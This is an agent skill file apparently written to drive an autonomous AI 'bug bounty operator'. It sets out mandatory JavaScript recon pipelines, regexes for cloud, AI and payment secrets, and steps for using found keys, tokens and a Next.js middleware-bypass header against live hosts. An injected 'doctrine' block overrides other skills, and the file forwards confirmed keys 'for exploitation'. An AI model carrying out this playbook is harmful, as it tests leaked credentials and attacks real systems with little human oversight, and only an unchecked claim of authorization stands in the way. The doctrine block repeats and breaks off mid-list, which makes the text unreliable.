---
name: apex-hunter
description: Autonomous backend bug bounty operator for authorized security testing. Use when hunting server-side vulnerabilities on in-scope targets — auth bypass, account takeover, privilege escalation, SSRF, SQLi/NoSQLi, RCE, deserialization, SSTI, mass assignment. Does not target frontend-only bugs.
---

# APEX-HUNTER v2 — Autonomous Backend Bug Bounty Operator

<!-- MANDATORY-JS-RECON-DOCTRINE v3 — injected across EVERY skill. Do not delete or gate behind a condition. -->

# 🚨 MANDATORY JS RECON GATE — NO SKIP, NO EXCEPTIONS

**This block is law in every skill.** Whatever else this skill does, if a web/HTTP target is
anywhere in scope you MUST complete the JS recon pipeline below BEFORE you conclude recon,
rank surface, declare "nothing found," or move to the next phase. Skipping any step is a
**process failure, not an optimization.** There is no file-count exception, no time-pressure
exception, no "it's a small app / SPA / static site" exception.

> Client-side JS is the attack-surface map of the entire application. Every bundle, chunk,
> worker, source map, service worker, and inline script leaks endpoints, secrets, roles,
> feature flags, and business logic the server never meant you to see. Hunters who skip JS lose the P1s.

---

## RULE 1 — ALL crawlers are MANDATORY on EVERY live host — plus 3 new mandatory classes

Run **all five** tool-classes — never just one, never "pick your favourite." Enumerate subdomains
first, then run this per host (each subdomain ships its own bundle, secrets, and logic):

```bash
subfinder -d "$T" -all -silent | httpx -silent -mc 200 -o live_hosts.txt   # per-host, not per-apex

# PASSIVE (zero-touch history — catches dead/forgotten/rotated-but-still-live JS)
echo "$HOST" | waybackurls | anew all_urls.txt
echo "$HOST" | gau --subs  | anew all_urls.txt
echo "$HOST" | waymore -mode U -oU waymore.txt 2>/dev/null; cat waymore.txt | anew all_urls.txt
awk '/\.js([?]|$)/' all_urls.txt | anew js.txt

# ACTIVE (live DOM, dynamic <script>, chunk loads)
katana   -u "https://$HOST" -jc -jsl -d 5 -kf all -aff -silent | anew all_urls.txt
hakrawler -u "https://$HOST" -d 3 -subs 2>/dev/null              | anew all_urls.txt
gospider  -s "https://$HOST" -d 3 --js  2>/dev/null              | anew all_urls.txt
cariddi   -s "https://$HOST" -intensive 2>/dev/null | grep '\.js'| anew js.txt
awk '/\.js([?]|$)/' all_urls.txt | anew js.txt

# MANDATORY: Service Workers (often forgotten, contain cache logic + secrets)
curl -sL "https://$HOST/sw.js"              -o "js_files/sw.js"              2>/dev/null
curl -sL "https://$HOST/service-worker.js"  -o "js_files/service-worker.js"  2>/dev/null
curl -sL "https://$HOST/manifest.json" | jq -r '.service_worker // empty'   2>/dev/null
# Check Web App Manifest for SW registration path and parse its scope

# MANDATORY: Inline JS extraction from every HTML page (tools miss embedded <script> blocks)
python3 - <<'PYEOF'
import re, sys, requests
from bs4 import BeautifulSoup
HOST = sys.argv[1] if len(sys.argv)>1 else ""
for path in ['/', '/app', '/dashboard', '/admin', '/login']:
    try:
        r = requests.get(f"https://{HOST}{path}", timeout=10,
                         headers={"User-Agent":"Mozilla/5.0"})
        soup = BeautifulSoup(r.text, 'html.parser')
        for i, tag in enumerate(soup.find_all('script', src=False)):
            if tag.string and len(tag.string) > 100:
                fname = f"js_files/inline_{path.strip('/') or 'root'}_{i}.js"
                open(fname,'w').write(tag.string)
                print(f"[INLINE] {fname} ({len(tag.string)} chars)")
        # Also capture window.__NEXT_DATA__, window.__NUXT__, window.__remixContext
        for pat in [r'window\.__NEXT_DATA__\s*=\s*({.+?});',
                    r'window\.__NUXT__\s*=\s*(.+?)\s*;',
                    r'window\.__remixContext\s*=\s*({.+?});']:
            m = re.search(pat, r.text, re.DOTALL)
            if m: print(f"[SSR-STATE] {pat[:20]}... FOUND at {HOST}{path}")
    except: pass
PYEOF

# MANDATORY: Framework-specific chunk paths (lazy bundles tools never trigger)
# Next.js
curl -s "https://$HOST/_next/static/chunks/pages/_app.js" | head -5 | grep -q 'function' && \
  echo "[NEXT.JS] _next/ chunks present" && \
  katana -u "https://$HOST" -d 3 -silent | grep '_next/static' | anew js.txt
# Nuxt
curl -s "https://$HOST/_nuxt/" -o /dev/null -w "%{http_code}" | grep -q 200 && \
  echo "[NUXT] _nuxt/ chunks present"
# Vite
curl -s "https://$HOST/assets/" -o /dev/null -w "%{http_code}" | grep -q 200 && \
  echo "[VITE] /assets/ present"
```

**MANUAL CRAWL is equally mandatory — tools miss auth-gated and lazy-loaded routes:**
- Open the app in a real browser with **Burp/mitmproxy inline**. **Log in.**
- Click through **every** route, tab, modal, multi-step wizard, settings/admin area.
- Watch the Network panel: every `.js`, every XHR/fetch, every WebSocket frame, every chunk
  pulled on navigation goes into `js.txt` / the endpoint list. SPAs load chunks lazily — a
  route you never visited = a bundle you never saw = bugs you never found.
- Toggle every feature flag you can find and capture the JS that loads behind each one.
- Burp extensions **JS Miner** + **Param Miner** + **JS Link Finder** run passively — enable all three.
- **In DevTools → Application tab:** check Service Workers registered, Cache Storage entries
  (cached JS/API responses), and Local Storage / Session Storage for tokens and flags.
- **In DevTools → Sources tab:** look for webpack internal entries (`webpack://`) and
  source-mapped originals — these are readable even without fetching `.map` separately.

---

## RULE 2 — Recover, beautify, DEOBFUSCATE, and READ every file (never grep-only)

```bash
sort -u js.txt -o js.txt && mkdir -p js_files beautified recovered deobfuscated
xargs -a js.txt -P20 -I@ sh -c 'curl -sL -A "Mozilla/5.0" "@" -o "js_files/$(echo @ | md5sum | cut -c1-16).js"'
for f in js_files/*.js; do js-beautify "$f" > "beautified/$(basename "$f")"; done

# SOURCE MAPS = full original source (readable, real var names, internal paths). A 200 is game over.
while read u; do
  s=$(curl -so /dev/null -w "%{http_code}" "$u.map")
  [ "$s" = "200" ] && echo "$u.map"
done < js.txt | tee sourcemaps_found.txt
# Recover each: sourcemapper -url URL -output ./recovered/   OR  unwebpack  OR  webcrack
# For multiple: cat sourcemaps_found.txt | xargs -I@ sourcemapper -url "@" -output ./recovered/

# WEBPACK DEOBFUSCATION — webcrack handles packed/self-executing bundles and recovers modules
# Install: npm install -g webcrack
for f in beautified/*.js; do
  webcrack "$f" -o "deobfuscated/$(basename "$f" .js)/" 2>/dev/null && \
    echo "[WEBCRACK] deobfuscated: $f"
done

# OBFUSCATOR.IO / eval-packed code — detect and unwrap
grep -l 'eval(function(p,a,c,k,e,d)' beautified/*.js | while read f; do
  node -e "var x=$(cat $f); if(typeof x==='string') console.log(x)" > "deobfuscated/$(basename $f)" 2>/dev/null
done
# String array rotation / hex strings
grep -l 'String\["fromCharCode"\]\|\\x[0-9a-f]\{2\}' beautified/*.js | \
  xargs -I@ sh -c 'node -e "eval(require(\"fs\").readFileSync(\"@\",\"utf8\"))" 2>/dev/null > deobfuscated/$(basename @)'

# WEBPACK: pull the runtime bootstrap's chunk-id→hash map to enumerate LAZY chunks no crawler triggered
grep -oE '[0-9]+:"[0-9a-f]{6,}"' beautified/*runtime* beautified/*.js 2>/dev/null | head -100
# Reconstruct chunk URLs: <publicPath>/<chunkId>.<hash>.chunk.js and fetch each
# Next.js chunks: /_next/static/chunks/<id>.<hash>.js
# Vite chunks: /assets/<name>.<hash>.js
```

**Grep is a triage pass to prioritize — NEVER the analysis itself.** Grep finds `apikey` and
`fetch(`. It does not tell you a URL-upload feature silently proxies server-side (SSRF), or that
a role flag is set client-side and never re-checked. **Every beautified/deobfuscated file gets
read end to end, including service workers and inline scripts.** No exception — budget the time;
this step is supposed to be slow.

---

## RULE 3 — Hunt these in every file (the money list — v2 expanded)

Static-scan to triage, then READ to confirm. Scanners: `trufflehog filesystem js_files/`
(verifies live keys), `jsluice urls|secrets js_files/*.js`, `mantra -f js.txt`,
`SecretFinder -i <f> -o cli`, `LinkFinder -i beautified/ -o cli`, `xnLinkFinder`,
`nuclei -t http/exposures/ -l js.txt`, `retire.js --js`, `whispers --target js_files/`.

### Secrets / Tokens (expanded — AI era + SaaS full coverage)

**Cloud & Infrastructure**
- **AWS** `AKIA…` access key + `aws_secret` 40-char key
- **GCP** `AIza[0-9A-Za-z\-_]{35}` + service-account JSON blob (`"type":"service_account"`)
- **Azure** storage connection strings `DefaultEndpointsProtocol=https;AccountName=...;AccountKey=...`; SAS tokens `?sv=`; tenant ID + `client_secret` in MSAL/ADAL config blocks
- **Databricks** `dapi[a-zA-Z0-9]{32}`
- **Snowflake** `account=...;user=...;password=...` in connection strings
- **MongoDB Atlas** `mongodb+srv://user:pass@cluster`
- **Redis** `redis://:password@host:port`
- **SMTP** `smtp://user:pass@host` in nodemailer/transporter configs
- **PEM private keys** `-----BEGIN (RSA |EC )?PRIVATE KEY-----`

**AI / ML Providers**
- **OpenAI** `sk-[A-Za-z0-9]{48}` and project keys `sk-proj-[A-Za-z0-9_\-]{48,}`
- **Anthropic** `sk-ant-[A-Za-z0-9\-_]{95,}` — full Claude API key
- **HuggingFace** `hf_[A-Za-z0-9]{34,}` — model download + write access
- **Replicate** `r8_[A-Za-z0-9]{40}`
- **Groq** `gsk_[A-Za-z0-9]{52}`
- **Cohere** `[A-Za-z0-9]{40}` with `cohere`/`CO_API_KEY` context
- **Together.ai** `[A-Za-z0-9]{40}` with `together`/`TOGETHER_API_KEY` context
- **Mistral** `[A-Za-z0-9]{32}` with `mistral`/`MISTRAL_API_KEY` context
- **Perplexity** `pplx-[A-Za-z0-9]{48}`
- **Pinecone** API key in vector DB init (`new Pinecone({ apiKey: … })`)
- **Voyage AI** `pa-[A-Za-z0-9]{40}`

**Payments & Finance**
- **Stripe** `sk_live_[0-9a-zA-Z]{24,}` / `sk_test_…`; webhook secret `whsec_[A-Za-z0-9]{32,}`
- **Braintree** `access_token$production$[A-Za-z0-9]{32}`
- **Square** `sq0atp-[A-Za-z0-9_\-]{22}` (access) / `sq0csp-[A-Za-z0-9_\-]{22}` (client secret)
- **Plaid** `client_id` + `secret` in PlaidLink init config
- **PayPal** `client_id` + `client_secret` in SDK init

**Communication & Messaging**
- **Twilio** `AC[a-zA-Z0-9]{32}` Account SID + `SK[a-z0-9]{32}` Auth Token
- **SendGrid** `SG.[A-Za-z0-9_\-]{22}.[A-Za-z0-9_\-]{43}`
- **Mailgun** `key-[a-zA-Z0-9]{32}`
- **Mailchimp** `[a-zA-Z0-9]{32}-us[0-9]{1,2}`
- **Slack** `xox[baprs]-…` / webhook `hooks.slack.com/services/…`
- **Discord bot** `[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}`
- **Telegram bot** `[0-9]+:AAF[a-zA-Z0-9_-]{33}`
- **Pusher** `app_key` + `app_secret` + cluster inline in Pusher JS init

**Developer & SaaS Platforms**
- **GitHub** `ghp_[A-Za-z0-9]{36}` / `github_pat_[A-Za-z0-9_]{82}`; webhook secret `sha256=` signing key
- **Vercel** `vc_[A-Za-z0-9]{32,}` / `VERCEL_TOKEN`
- **Netlify** `netlify-[A-Za-z0-9\-_]{40}`
- **Shopify** `shpss_[A-Za-z0-9]{32}` / `shpat_[A-Za-z0-9]{32}`; webhook HMAC secret
- **Algolia admin key** `[A-Za-z0-9]{32}` with `adminApiKey` label
- **Mapbox** `sk.[A-Za-z0-9]{80,}`
- **Datadog** `DD_API_KEY` / `datadog-[A-Za-z0-9]{32}`
- **Intercom** `[A-Za-z0-9]{8}-[A-Za-z0-9]{4}-…` with `intercom` context
- **Okta** `SSWS [A-Za-z0-9]{42}` API token
- **Auth0** `client_secret` in SPA SDK init; management API token `v2/…`
- **New Relic** `NRAK-[A-Za-z0-9]{27}` license key
- **Sentry DSN** `https://[key]@[org].ingest.sentry.io/[id]` — reveals org, project, DSN secret
- **LaunchDarkly** `sdk-[A-Za-z0-9\-]{40}` server-side key (write access to flags)
- **Segment** write key `[A-Za-z0-9]{32}` with `analytics.load(` context

**Auth & Crypto**
- **JWTs** `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`
- **Basic auth blobs** `Authorization: Basic [A-Za-z0-9+/=]{20,}`
- **OAuth** `client_id` + `client_secret` pairs
- **Apple APNs** `.p8` private key + Team ID + Key ID in push notification config

**Firebase / Supabase / Realtime DBs**
- **Firebase config object** `apiKey`, `authDomain`, `projectId`, `storageBucket`, `messagingSenderId`, `appId` — reveals project, enables unauth REST probing even if the key itself is "public"
- **Supabase** `SUPABASE_ANON_KEY` / `SUPABASE_SERVICE_ROLE_KEY` (service role = full DB access)

**Cloudinary**
- `cloudinary://[api_key]:[api_secret]@cloud_name` in upload preset config

**WebRTC**
- `iceServers` config with `urls: turn:...` + `username` + `credential` — TURN server credentials, test for reuse

### Hidden / Internal / Staging Endpoints
Every endpoint in JS is an UNTESTED endpoint. Real payout pattern: `/api/v2/internal/users`
recovered from obfuscated JS → full user DB → $25k. Also hunt:
- **WebSocket/SSE** `ws://`, `wss://`, `/subscribe`, `/stream`, `/sse`, `/events` — WS endpoints
  skip HTTP auth middleware and are frequently unprotected
- **GraphQL subscriptions** `subscription {`, `/subscriptions`, `/graphql-ws`
- **Deprecated v1 APIs** when v2 added auth — the old version often still runs
- **`window.__NEXT_DATA__`** — Next.js SSR embeds server-side API responses verbatim in HTML;
  often contains auth tokens, session data, internal API base URLs, and user PII
- **`window.__NUXT__`** — same problem on Nuxt apps
- **`window.__remixContext`** — Remix loader data embedded in HTML

### Critical Architecture & Logic Findings (only readable, not greppable)

These are the findings that separate JS readers from JS greppers. No scanner catches these — you find them only by understanding the code.

**Internal attack surface expansion**
- Internal microservice URLs (`http://internal-api/`, `http://10.x.x.x/`, `grpc://`) → direct SSRF targets not reachable from outside
- Shadow API versions: `v0`, `beta`, `internal`, `legacy` paths referenced in code but absent from docs — old version often has no auth
- Admin/ops routes (`/admin`, `/internal`, `/ops`, `/debug`) with comments revealing auth requirements (or lack of)
- Lambda function URLs, API Gateway stage variables, Cloud Function names → direct invocation bypassing WAF/rate limit
- S3/GCS/Azure blob container names in upload/download logic → enumerate + test ACL misconfig
- gRPC service + method names → probe for exposed gRPC-web endpoints without auth
- Cloud account IDs, project IDs, tenant IDs → enumerate cross-tenant

**Auth & authz logic that breaks server-side**
- Client-side role checks (`if (user.role === 'admin')`) → call the endpoint directly with low-priv token; server may never re-validate → BFLA
- Feature flags controlling security controls (`if (flags.skipRateLimit)`, `if (!flags.enforceAuth)`) → send overridden flag value in request/cookie
- Environment detection: `if (process.env.NODE_ENV !== 'production') { skip2FA() }` → probe if staging logic bleeds into prod headers
- Multi-tenant switching: how `org_id`/`tenant_id` is set client-side → test with another tenant's ID → horizontal escalation
- Permission bitmask definitions client-side → craft value that grants escalated bits
- A/B test variant code that unlocks privileged UI or unguarded endpoints for a subset of users

**Business logic & price manipulation**
- Price, discount, shipping, tax calculation done client-side → send manipulated values directly to order endpoint
- Promo/referral/coupon code generation patterns → predictable? Brute-forceable?
- Payment flow state machine definition → identify step-skip to complete order without payment leg
- Quantity / negative-value handling in cart logic → test negative quantities for credit

**Token & crypto weaknesses (read the generation code)**
- Token generation using `Math.random()`, `Date.now()`, or short entropy → predictable; reproduce offline
- Client-side encryption with hardcoded IV or key → decrypt intercepted traffic offline
- Password hashing revealed: `md5(pass + salt)`, `sha1(pass)` → crack offline
- HMAC signing with client-visible secret → forge arbitrary signed requests
- JWT construction showing which claims are client-set and which the server skips validating

**Injection hints buried in logic**
- SQL fragments in ORM calls: `db.raw(userInput)`, `knex.raw(…)`, `sequelize.query(userInput)` → direct SQLi target
- GraphQL query/mutation definitions → identify sensitive fields, hidden resolvers not in introspection
- Template strings fed to eval or innerHTML: `` eval(`SELECT ${input}`) `` → confirmed injection sink
- Regex input validation patterns → find gaps, edge cases, Unicode bypasses

**CORS / postMessage / redirect bypass hints**
- `allowedOrigins` array → find weakest entry (wildcard subdomain? `null` origin accepted?)
- postMessage handler: `event.data[action]()` or `window[event.data.fn]()` without `event.origin` check → XSS pivot from any frame
- Redirect whitelist using `startsWith`: `url.startsWith('https://company.com')` → bypass with `https://company.com.evil.com`
- CORS logic: `if (allowedOrigins.includes(req.headers.origin))` — test `null` origin, `Origin: ` (empty)

**Recon amplifiers (fingerprint hidden features)**
- Analytics event names (`track('admin_panel_viewed')`) → enumerate hidden features/flows not linked in nav
- Error handler stack traces → reveals internal file paths, framework versions, DB query structure
- `console.log` / `console.debug` statements left in prod → tokens, IDs, internal state dumped to DevTools

### Client-Side Auth & Roles
`isAdmin`, `role === 'admin'`, `hasPermission`, `parseJwt`, `atob(token)`,
`localStorage.setItem('admin',…)`, `featureFlags`, `canAccess`, `tier === 'enterprise'`.
Any UI/route gated ONLY client-side → call the endpoint directly with a low-priv token.

### Hidden Routes & Feature Flags
Dump SPA router table (React Router / Vue Router / Angular / Next.js pages directory).
Visit admin/beta/internal routes the nav never links. Flip feature flags (`localStorage`,
`?feature=`, cookie, JSON config, LaunchDarkly/Statsig/Split client keys) to unlock
ungated functionality.

### DOM XSS Sinks
`innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`, `setTimeout("…")`,
jQuery `$()`, `.html()`, `dangerouslySetInnerHTML`, `v-html`, Angular `bypassSecurityTrustHtml`;
sources `location.hash/search/href`, `postMessage`, `document.referrer`, `window.name` → trace source→sink.

### Prototype Pollution
`__proto__`, unsafe `merge/extend/Object.assign(x.prototype…)`, query-string parsers,
`qs.parse`/`querystring.parse` feeding into merge → gadget chain to XSS/RCE.

### Cloud & 3rd-party Refs
`*.amazonaws.com`/`s3://`, `firebaseio.com`, `storage.googleapis.com`,
`*.blob.core.windows.net`, `cloudfront.net`, `*.digitaloceanspaces.com`,
`supabase.co`, `*.neon.tech`, `*.planetscale.com` → test misconfig + takeover.

### postMessage Without Origin Check
`addEventListener('message',…)` with no `e.origin` check → cross-origin data theft / DOM XSS.

### Dependency CVEs
Map bundled lib versions to OSV/Snyk (`retire.js`). One bundled vulnerable lodash / axios /
DOMPurify / jQuery / Next.js = your bug. **2025 critical:** Next.js CVE-2025-29927
(middleware auth bypass via `x-middleware-subrequest` header — any Next.js ≤ 15.2.2).

### Historical / Version Diffing
Pull OLD JS from Wayback, diff vs live. Secrets and endpoints "removed" from current JS are
frequently STILL LIVE server-side; forgotten APIs survive in old bundles.

### Obfuscation as a Red Flag
Heavy obfuscation (`eval(function(p,a,c,k,e,d)`, string arrays, hex strings, `_0x` var names)
signals the developer was trying to hide something. Deobfuscate with `webcrack` / `synchrony` /
`de4js` and READ — the payoff rate on obfuscated code is higher than on readable code.

---

## RULE 4 — Confirm dynamically, THEN it's a finding (kill false positives)

Nothing gets reported on a regex hit alone. Prove it live:
- **OAuth client creds** → mint a real token:
  `curl -sX POST https://apigw.$T/token -H "Authorization: Basic <BLOB>" -d grant_type=client_credentials`
  → `access_token` returned = confirmed High/Crit (can't rotate without breaking prod).
- **AI API key** → call the provider's identity/model-list endpoint:
  `curl -s https://api.openai.com/v1/models -H "Authorization: Bearer $KEY"` → 200 = live.
  `curl -s https://api.anthropic.com/v1/models -H "x-api-key: $KEY" -H "anthropic-version: 2023-06-01"` → 200 = live.
- **`window.__NEXT_DATA__`** → curl the page without JS (`curl -sL https://HOST/page`) and
  parse the JSON blob from the HTML — if it contains session tokens or user PII, that's a finding.
- **"Internal" endpoint** → hit it unauth / cross-tenant and diff the response.
- **Params from JS** → fuzz `debug=true`, `admin=1`, `callback=`, `redirect=` and JS-seeded names
  (`x8` / `Arjun` from bundle var names) against the endpoints they belong to.
- **DOM XSS** → drive source→sink in real headless Chrome (Playwright preferred over Selenium);
  screenshot the alert/exfil.
- **WebSocket endpoint** → connect with `wscat`/`websocat` without auth header; send a probe message.
- **Next.js middleware bypass** → add `x-middleware-subrequest: middleware:middleware:middleware`
  header to any request behind a Next.js middleware guard; 200/data = CVE-2025-29927 confirmed.
- Feed confirmed secret keys to the **jsmax** skill for exploitation; DOM-XSS / prototype-pollution
  gadgets to the **xss-hunter-agent** skill for payload crafting.

- **Race condition** → fire 20+ parallel requests simultaneously (curl `--parallel` / Python asyncio+aiohttp / Playwright multi-context); confirm with: multiple `200 OK` on one-time-use action, duplicate records, balance goes negative, two success responses for a single-use token. Build the script fresh per target — timing constraints differ per app.
- **Secret new patterns** → confirm with provider identity endpoint: Twilio `api.twilio.com/2010-04-01/Accounts/$SID.json` (Basic auth); Stripe `/v1/account`; Mailgun `/v3/domains`; Discord `/api/v10/users/@me`; Telegram `api.telegram.org/bot$TOKEN/getMe`; Databricks `/api/2.0/token/list`; Supabase service role → `supabase.co/rest/v1/` with `apikey:` header (returns full table data = confirmed)
- **Business logic / price manipulation** → capture the POST body, modify the price/quantity field, replay with curl; confirm server used the client value in response total
- **Internal URL SSRF** → hit it via a server-side parameter that makes the app fetch a URL; confirm with `interactsh` callback or timing difference
- **Multi-tenant ID swap** → repeat the request with a different org/tenant ID; confirm data returned belongs to the other tenant

**Only then write the report.** No "could potentially" — prove it or drop it.

---

## CAPABILITY MAP — what runs autonomously vs. needs human

| Finding class | Autonomous (find + PoC + confirm) | Notes |
|---|---|---|
| Secret in JS | ✅ Full | grep → curl identity endpoint → confirmed |
| Unauth API endpoint | ✅ Full | curl without auth → check data returned |
| CORS bypass | ✅ Full | curl with crafted Origin header |
| SSRF via internal URL | ✅ Full | curl + interactsh callback |
| JWT attack (alg:none, claim tamper) | ✅ Full | craft JWT → curl |
| GraphQL introspection + BOLA | ✅ Full | full query chain |
| Price / business logic manipulation | ✅ Full | modified POST body via curl |
| Redirect bypass | ✅ Full | curl -L with crafted URL |
| Feature flag abuse | ✅ Full | send overridden flag value |
| S3/GCS/Firebase unauth | ✅ Full | aws s3 ls / curl REST |
| Race condition | ✅ Full | curl --parallel / asyncio / Playwright multi-context (script built fresh per target) |
| DOM-XSS | ⚠️ Script provided | Drive with claude-in-chrome or Playwright — needs browser session |
| postMessage XSS | ⚠️ Script provided | Write exploit HTML; user loads it |
| Auth flow logic bugs | ⚠️ Needs session | Requires authenticated cookies/tokens from user |
| CAPTCHA-gated flows | 🚫 Human-in-loop | Firm boundary — user solves, automation continues |
| MFA bypass | 🚫 Needs real device | Requires live TOTP/SMS |
| Client-side crypto weakness | 🔍 Identify + explain | Code identified, math worked through manually |
| Deobfuscation | ⚠️ Tool-dependent | Requires webcrack/synchrony installed; check first |
| Prototype pollution | ⚠️ Script provided | Find sink + write PoC; browser execution needed |

---


<!-- MANDATORY-JS-RECON-DOCTRINE v2 — injected across EVERY skill. Do not delete or gate behind a condition. -->

# 🚨 MANDATORY JS RECON GATE — NO SKIP, NO EXCEPTIONS

**This block is law in every skill.** Whatever else this skill does, if a web/HTTP target is
anywhere in scope you MUST complete the JS recon pipeline below BEFORE you conclude recon,
rank surface, declare "nothing found," or move to the next phase. Skipping any step is a
**process failure, not an optimization.** There is no file-count exception, no time-pressure
exception, no "it's a small app / SPA / static site" exception.

> Client-side JS is the attack-surface map of the entire application. Every bundle, chunk,
> worker, source map, service worker, and inline script leaks endpoints, secrets, roles,
> feature flags, and business logic the server never meant you to see. Hunters who skip JS lose the P1s.

---

## RULE 1 — ALL crawlers are MANDATORY on EVERY live host — plus 3 new mandatory classes

Run **all five** tool-classes — never just one, never "pick your favourite." Enumerate subdomains
first, then run this per host (each subdomain ships its own bundle, secrets, and logic):

```bash
subfinder -d "$T" -all -silent | httpx -silent -mc 200 -o live_hosts.txt   # per-host, not per-apex

# PASSIVE (zero-touch history — catches dead/forgotten/rotated-but-still-live JS)
echo "$HOST" | waybackurls | anew all_urls.txt
echo "$HOST" | gau --subs  | anew all_urls.txt
echo "$HOST" | waymore -mode U -oU waymore.txt 2>/dev/null; cat waymore.txt | anew all_urls.txt
awk '/\.js([?]|$)/' all_urls.txt | anew js.txt

# ACTIVE (live DOM, dynamic <script>, chunk loads)
katana   -u "https://$HOST" -jc -jsl -d 5 -kf all -aff -silent | anew all_urls.txt
hakrawler -u "https://$HOST" -d 3 -subs 2>/dev/null              | anew all_urls.txt
gospider  -s "https://$HOST" -d 3 --js  2>/dev/null              | anew all_urls.txt
cariddi   -s "https://$HOST" -intensive 2>/dev/null | grep '\.js'| anew js.txt
awk '/\.js([?]|$)/' all_urls.txt | anew js.txt

# MANDATORY: Service Workers (often forgotten, contain cache logic + secrets)
curl -sL "https://$HOST/sw.js"              -o "js_files/sw.js"              2>/dev/null
curl -sL "https://$HOST/service-worker.js"  -o "js_files/service-worker.js"  2>/dev/null
curl -sL "https://$HOST/manifest.json" | jq -r '.service_worker // empty'   2>/dev/null
# Check Web App Manifest for SW registration path and parse its scope

# MANDATORY: Inline JS extraction from every HTML page (tools miss embedded <script> blocks)
python3 - <<'PYEOF'
import re, sys, requests
from bs4 import BeautifulSoup
HOST = sys.argv[1] if len(sys.argv)>1 else ""
for path in ['/', '/app', '/dashboard', '/admin', '/login']:
    try:
        r = requests.get(f"https://{HOST}{path}", timeout=10,
                         headers={"User-Agent":"Mozilla/5.0"})
        soup = BeautifulSoup(r.text, 'html.parser')
        for i, tag in enumerate(soup.find_all('script', src=False)):
            if tag.string and len(tag.string) > 100:
                fname = f"js_files/inline_{path.strip('/') or 'root'}_{i}.js"
                open(fname,'w').write(tag.string)
                print(f"[INLINE] {fname} ({len(tag.string)} chars)")
        # Also capture window.__NEXT_DATA__, window.__NUXT__, window.__remixContext
        for pat in [r'window\.__NEXT_DATA__\s*=\s*({.+?});',
                    r'window\.__NUXT__\s*=\s*(.+?)\s*;',
                    r'window\.__remixContext\s*=\s*({.+?});']:
            m = re.search(pat, r.text, re.DOTALL)
            if m: print(f"[SSR-STATE] {pat[:20]}... FOUND at {HOST}{path}")
    except: pass
PYEOF

# MANDATORY: Framework-specific chunk paths (lazy bundles tools never trigger)
# Next.js
curl -s "https://$HOST/_next/static/chunks/pages/_app.js" | head -5 | grep -q 'function' && \
  echo "[NEXT.JS] _next/ chunks present" && \
  katana -u "https://$HOST" -d 3 -silent | grep '_next/static' | anew js.txt
# Nuxt
curl -s "https://$HOST/_nuxt/" -o /dev/null -w "%{http_code}" | grep -q 200 && \
  echo "[NUXT] _nuxt/ chunks present"
# Vite
curl -s "https://$HOST/assets/" -o /dev/null -w "%{http_code}" | grep -q 200 && \
  echo "[VITE] /assets/ present"
```

**MANUAL CRAWL is equally mandatory — tools miss auth-gated and lazy-loaded routes:**
- Open the app in a real browser with **Burp/mitmproxy inline**. **Log in.**
- Click through **every** route, tab, modal, multi-step wizard, settings/admin area.
- Watch the Network panel: every `.js`, every XHR/fetch, every WebSocket frame, every chunk
  pulled on navigation goes into `js.txt` / the endpoint list. SPAs load chunks lazily — a
  route you never visited = a bundle you never saw = bugs you never found.
- Toggle every feature flag you can find and capture the JS that loads behind each one.
- Burp extensions **JS Miner** + **Param Miner** + **JS Link Finder** run passively — enable all three.
- **In DevTools → Application tab:** check Service Workers registered, Cache Storage entries
  (cached JS/API responses), and Local Storage / Session Storage for tokens and flags.
- **In DevTools → Sources tab:** look for webpack internal entries (`webpack://`) and
  source-mapped originals — these are readable even without fetching `.map` separately.

---

## RULE 2 — Recover, beautify, DEOBFUSCATE, and READ every file (never grep-only)

```bash
sort -u js.txt -o js.txt && mkdir -p js_files beautified recovered deobfuscated
xargs -a js.txt -P20 -I@ sh -c 'curl -sL -A "Mozilla/5.0" "@" -o "js_files/$(echo @ | md5sum | cut -c1-16).js"'
for f in js_files/*.js; do js-beautify "$f" > "beautified/$(basename "$f")"; done

# SOURCE MAPS = full original source (readable, real var names, internal paths). A 200 is game over.
while read u; do
  s=$(curl -so /dev/null -w "%{http_code}" "$u.map")
  [ "$s" = "200" ] && echo "$u.map"
done < js.txt | tee sourcemaps_found.txt
# Recover each: sourcemapper -url URL -output ./recovered/   OR  unwebpack  OR  webcrack
# For multiple: cat sourcemaps_found.txt | xargs -I@ sourcemapper -url "@" -output ./recovered/

# WEBPACK DEOBFUSCATION — webcrack handles packed/self-executing bundles and recovers modules
# Install: npm install -g webcrack
for f in beautified/*.js; do
  webcrack "$f" -o "deobfuscated/$(basename "$f" .js)/" 2>/dev/null && \
    echo "[WEBCRACK] deobfuscated: $f"
done

# OBFUSCATOR.IO / eval-packed code — detect and unwrap
grep -l 'eval(function(p,a,c,k,e,d)' beautified/*.js | while read f; do
  node -e "var x=$(cat $f); if(typeof x==='string') console.log(x)" > "deobfuscated/$(basename $f)" 2>/dev/null
done
# String array rotation / hex strings
grep -l 'String\["fromCharCode"\]\|\\x[0-9a-f]\{2\}' beautified/*.js | \
  xargs -I@ sh -c 'node -e "eval(require(\"fs\").readFileSync(\"@\",\"utf8\"))" 2>/dev/null > deobfuscated/$(basename @)'

# WEBPACK: pull the runtime bootstrap's chunk-id→hash map to enumerate LAZY chunks no crawler triggered
grep -oE '[0-9]+:"[0-9a-f]{6,}"' beautified/*runtime* beautified/*.js 2>/dev/null | head -100
# Reconstruct chunk URLs: <publicPath>/<chunkId>.<hash>.chunk.js and fetch each
# Next.js chunks: /_next/static/chunks/<id>.<hash>.js
# Vite chunks: /assets/<name>.<hash>.js
```

**Grep is a triage pass to prioritize — NEVER the analysis itself.** Grep finds `apikey` and
`fetch(`. It does not tell you a URL-upload feature silently proxies server-side (SSRF), or that
a role flag is set client-side and never re-checked. **Every beautified/deobfuscated file gets
read end to end, including service workers and inline scripts.** No exception — budget the time;
this step is supposed to be slow.

---

## RULE 3 — Hunt these in every file (the money list — v2 expanded)

Static-scan to triage, then READ to confirm. Scanners: `trufflehog filesystem js_files/`
(verifies live keys), `jsluice urls|secrets js_files/*.js`, `mantra -f js.txt`,
`SecretFinder -i <f> -o cli`, `LinkFinder -i beautified/ -o cli`, `xnLinkFinder`,
`nuclei -t http/exposures/ -l js.txt`, `retire.js --js`, `whispers --target js_files/`.

### Secrets / Tokens (expanded — AI era keys included)
- **AWS** `AKIA…` access key + `aws_secret` 40-char key
- **GCP** `AIza[0-9A-Za-z\-_]{35}` + service-account JSON blob (`"type":"service_account"`)
- **OpenAI** `sk-[A-Za-z0-9]{48}` and project keys `sk-proj-[A-Za-z0-9_\-]{48,}`
